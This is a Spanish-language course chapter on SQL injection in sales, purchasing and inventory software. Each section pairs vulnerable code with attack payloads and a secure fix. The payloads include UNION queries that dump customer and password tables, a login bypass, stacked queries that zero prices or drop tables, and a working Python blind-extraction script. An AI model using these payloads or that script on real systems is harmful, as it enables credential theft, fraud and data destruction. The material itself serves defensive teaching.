# 7.5 Ejemplos Prácticos en Ventas, Compras e Inventarios

## Escenario: Sistema POS (Punto de Venta)

### 1. Vulnerabilidad en Búsqueda de Productos

**Código Vulnerable (PHP):**
```php
<?php
// ❌ VULNERABLE
$busqueda = $_GET['buscar'];
$sql = "SELECT * FROM productos WHERE nombre_comercial LIKE '%$busqueda%'";
$result = mysqli_query($conn, $sql);
?>
```

**Ataque:**
```
URL: /productos.php?buscar=laptop' UNION SELECT id_producto,sku,nombre_comercial,descripcion,precio_venta,stock_actual,activo FROM clientes --

Payload: laptop' UNION SELECT id_producto, sku, nombre_comercial, email, credito_limite, 1, TRUE FROM clientes --
```

**Explotación Completa:**
```sql
-- 1. Enumerar columnas
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
' ORDER BY 5 --
' ORDER BY 6 --
' ORDER BY 7 --   ← Error, tiene 6 columnas

-- 2. Obtener datos de clientes a través de búsqueda de productos
laptop' UNION SELECT 1, id_cliente, nombre, email, telefono, credito_limite, NULL FROM clientes --

-- 3. Obtener credenciales (si existen)
laptop' UNION SELECT 1, id, usuario, password, email, rol, NULL FROM usuarios --

-- 4. Modificar precios (si el usuario tiene permisos DML)
laptop'; UPDATE productos SET precio_venta = 0.01 WHERE id_producto > 0; --
```

**Código Seguro:**
```php
<?php
// ✅ SEGURO
$busqueda = $_GET['buscar'] . '%';
$stmt = $conn->prepare("SELECT * FROM productos WHERE nombre_comercial LIKE ? AND activo = TRUE");
$stmt->bind_param("s", $busqueda);
$stmt->execute();
$result = $stmt->get_result();
?>
```

### 2. Vulnerabilidad en Login del POS

**Código Vulnerable (Python):**
```python
# ❌ VULNERABLE
usuario = request.form['usuario']
password = request.form['password']

cursor.execute(f"SELECT * FROM vendedores WHERE codigo = '{usuario}' AND password = '{password}'")
vendedor = cursor.fetchone()

if vendedor:
    session['vendedor'] = vendedor
```

**Ataque:**
```
Usuario: admin
Password: ' OR '1'='1' --

O también:
Usuario: cualquier
Password: ' UNION SELECT 1,'admin','Admin','admin@hack.com',100,TRUE,NULL,NULL --
```

**Código Seguro:**
```python
# ✅ SEGURO
usuario = request.form['usuario']
password = request.form['password']

cursor.execute("SELECT * FROM vendedores WHERE codigo = %s AND password = SHA2(%s, 256)", 
               (usuario, password))
vendedor = cursor.fetchone()
```

### 3. Ataque a Módulo de Descuentos

**URL Vulnerable:**
```
/facturar.php?id=100&descuento=50
```

**Código:**
```php
<?php
// ❌ VULNERABLE
$id_factura = $_GET['id'];
$descuento = $_GET['descuento'];
mysqli_query($conn, "UPDATE facturas SET descuento = $descuento WHERE id_factura = $id_factura");
?>
```

**Ataque:**
```
/facturar.php?id=100&descuento=100
/facturar.php?id=100&descuento=999999
/facturar.php?id=100 OR 1=1&descuento=100  ← descuento a TODAS las facturas
```

**Payload avanzado:**
```
/facturar.php?id=100; UPDATE facturas SET total = 0.01 WHERE id_factura = 100; -- &descuento=100
```

**Código Seguro:**
```php
<?php
// ✅ SEGURO
$id_factura = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
$descuento = filter_input(INPUT_GET, 'descuento', FILTER_VALIDATE_FLOAT, 
    ['options' => ['min_range' => 0, 'max_range' => 100]]);

if (!$id_factura || $descuento === false) {
    die("Parámetros inválidos");
}

$stmt = $conn->prepare("UPDATE facturas SET descuento = ? WHERE id_factura = ?");
$stmt->bind_param("di", $descuento, $id_factura);
$stmt->execute();
?>
```

## Escenario: Órdenes de Compra

### 4. Inyección en Filtros de Búsqueda

**Código Vulnerable (Java):**
```java
// ❌ VULNERABLE
String proveedor = request.getParameter("proveedor");
String fechaInicio = request.getParameter("fecha_inicio");
String fechaFin = request.getParameter("fecha_fin");

Statement stmt = conn.createStatement();
String sql = "SELECT * FROM ordenes_compra WHERE " +
    "id_proveedor IN (SELECT id_proveedor FROM proveedores WHERE nombre LIKE '%" + proveedor + "%') " +
    "AND fecha_emision BETWEEN '" + fechaInicio + "' AND '" + fechaFin + "'";
ResultSet rs = stmt.executeQuery(sql);
```

**Ataque Time-based:**
```
/filtro_ordenes.jsp?proveedor=' OR IF(SUBSTRING((SELECT password FROM usuarios LIMIT 0,1),1,1)='a', SLEEP(5), 0) -- &fecha_inicio=2024-01-01&fecha_fin=2024-12-31
```

**Extracción de datos completa con Python:**
```python
import requests
import string
import time

url = "http://target.com/filtro_ordenes.jsp"
chars = string.ascii_lowercase + string.digits

def blind_extract(query, length=50):
    result = ""
    for pos in range(1, length+1):
        for c in chars:
            payload = f"' OR IF(SUBSTRING(({query}),{pos},1)='{c}', SLEEP(3), 0) -- "
            params = {
                "proveedor": payload,
                "fecha_inicio": "2024-01-01",
                "fecha_fin": "2024-12-31"
            }
            start = time.time()
            try:
                r = requests.get(url, params=params, timeout=10)
                if time.time() - start > 2:
                    result += c
                    print(f"\r[+] Extracting: {result}", end="")
                    break
            except:
                pass
        else:
            break
    return result

# Extraer base de datos
db = blind_extract("database()")
print(f"\n[+] Database: {db}")

# Extraer nombre de tabla
for i in range(10):
    table_query = f"SELECT table_name FROM information_schema.tables LIMIT {i},1"
    table = blind_extract(table_query)
    if table:
        print(f"[+] Table {i}: {table}")
```

**Código Seguro:**
```java
// ✅ SEGURO
String sql = "SELECT oc.* FROM ordenes_compra oc " +
    "JOIN proveedores p ON oc.id_proveedor = p.id_proveedor " +
    "WHERE p.nombre LIKE ? AND oc.fecha_emision BETWEEN ? AND ?";

PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, "%" + request.getParameter("proveedor") + "%");
stmt.setDate(2, Date.valueOf(request.getParameter("fecha_inicio")));
stmt.setDate(3, Date.valueOf(request.getParameter("fecha_fin")));
ResultSet rs = stmt.executeQuery();
```

## Escenario: Inventario

### 5. Ataque a Ajuste de Inventario

**Código Vulnerable (Node.js):**
```javascript
// ❌ VULNERABLE
app.post('/api/ajustar-stock', (req, res) => {
    const { producto, cantidad, motivo } = req.body;
    
    db.query(`UPDATE productos_stock 
              SET stock_actual = stock_actual + ${cantidad}
              WHERE id_producto = ${producto}`, (err, result) => {
        res.json({ success: true });
    });
});
```

**Ataque:**
```json
POST /api/ajustar-stock
{
    "producto": "1; UPDATE productos SET precio_venta = precio_venta * 0.01 WHERE id_producto > 0; --",
    "cantidad": "100",
    "motivo": "Ajuste manual"
}
```

**Payload destructivo:**
```json
{
    "producto": "1; DROP TABLE facturas_detalle; --",
    "cantidad": "0",
    "motivo": ""
}
```

**Código Seguro:**
```javascript
// ✅ SEGURO
app.post('/api/ajustar-stock', async (req, res) => {
    const { producto, cantidad, motivo } = req.body;
    
    // Validar tipos
    const idProducto = parseInt(producto);
    const cantidadAjuste = parseFloat(cantidad);
    
    if (isNaN(idProducto) || isNaN(cantidadAjuste)) {
        return res.status(400).json({ error: 'Parámetros inválidos' });
    }
    
    // Validar rango
    if (Math.abs(cantidadAjuste) > 10000) {
        return res.status(400).json({ error: 'Ajuste demasiado grande' });
    }
    
    // Prepared Statement
    const [result] = await conn.execute(
        'UPDATE productos_stock SET stock_actual = stock_actual + ? WHERE id_producto = ?',
        [cantidadAjuste, idProducto]
    );
    
    // Auditoría
    await conn.execute(
        'INSERT INTO inventario_movimientos (id_producto, tipo_movimiento, cantidad, usuario, notas) VALUES (?, ?, ?, ?, ?)',
        [idProducto, 'ajuste_manual', cantidadAjuste, req.user, motivo]
    );
    
    res.json({ success: true });
});
```

### 6. Inyección en API RESTful

**Vulnerabilidad:**
```
GET /api/productos?categoria=1&precio_min=100&precio_max=500&orden=nombre
```

**Código vulnerable:**
```python
# ❌ VULNERABLE
categoria = request.args.get('categoria')
precio_min = request.args.get('precio_min', 0)
precio_max = request.args.get('precio_max', 999999)
orden = request.args.get('orden', 'nombre')

query = f"""SELECT * FROM productos 
WHERE id_categoria = {categoria} 
AND precio_venta BETWEEN {precio_min} AND {precio_max}
ORDER BY {orden}"""
```

**Ataque:**
```
GET /api/productos?categoria=1 UNION SELECT 1,usuario,password,rol,email,1,TRUE FROM usuarios--&precio_min=100&precio_max=500&orden=nombre

GET /api/productos?categoria=1&precio_min=100&precio_max=500&orden=(SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN nombre ELSE precio_venta END)
```

**Código Seguro:**
```python
# ✅ SEGURO
categoria = request.args.get('categoria', type=int)
precio_min = request.args.get('precio_min', default=0, type=float)
precio_max = request.args.get('precio_max', default=999999, type=float)

# Whitelist para ORDER BY
orden_permitido = {
    'nombre': 'nombre_comercial',
    'precio': 'precio_venta',
    'stock': 'stock_actual',
    'categoria': 'id_categoria'
}
orden = orden_permitido.get(request.args.get('orden', 'nombre'), 'nombre')

query = """SELECT * FROM productos 
WHERE id_categoria = %s 
AND precio_venta BETWEEN %s AND %s
ORDER BY {}""".format(orden)

cursor.execute(query, (categoria, precio_min, precio_max))
```

## Protección Recomendada por Sector

### Módulo de Ventas
```
Campos críticos:    id_cliente, id_producto, precio, cantidad, descuento
Protección:         Prepared statements, validación de tipos, whitelist en descuentos
Auditoría:          Registrar cambios de precios, descuentos grandes
```

### Módulo de Compras
```
Campos críticos:    id_proveedor, precio_compra, cantidad, fechas
Protección:         Prepared statements, validación de rangos, aprobación multi-nivel
Auditoría:          Órdenes grandes, cambios a proveedores
```

### Módulo de Inventarios
```
Campos críticos:    stock, costo_promedio, precio_compra
Protección:         Prepared statements, triggers de validación, ajustes requieren autorización
Auditoría:          Todos los movimientos, ajustes grandes, transferencias
```

## Plan de Respuesta a Incidente

```sql
-- 1. DETECTAR ATAQUE
-- Buscar patrones sospechosos en logs
SELECT * FROM mysql.general_log 
WHERE argument REGEXP 'UNION|SLEEP|0x|DROP|--|#' 
ORDER BY event_time DESC;

-- 2. CONTENER
-- Bloquear IP atacante (firewall/iptables)
-- Deshabilitar usuario comprometido
-- Poner aplicación en modo mantenimiento

-- 3. ANALIZAR DAÑO
-- Revisar tablas modificadas
SELECT * FROM facturas WHERE estado != 'activa' AND fecha_emision > '2024-01-01';
SELECT * FROM productos WHERE precio_venta < 1;
SELECT * FROM productos_stock WHERE stock_actual > 10000;

-- 4. RECUPERAR
-- Restaurar desde backup
-- Aplicar parche de seguridad
-- Cambiar todas las contraseñas

-- 5. PREVENIR
-- Implementar prepared statements
-- Agregar WAF
-- Auditoría continua
```

---

## Anterior: [04 Prevencion](../07-sql-injection/04-prevencion.md)
## Siguiente: [01 Hardening Bases Datos](../08-seguridad/01-hardening-bases-datos.md)

[Volver al índice](../README.md)
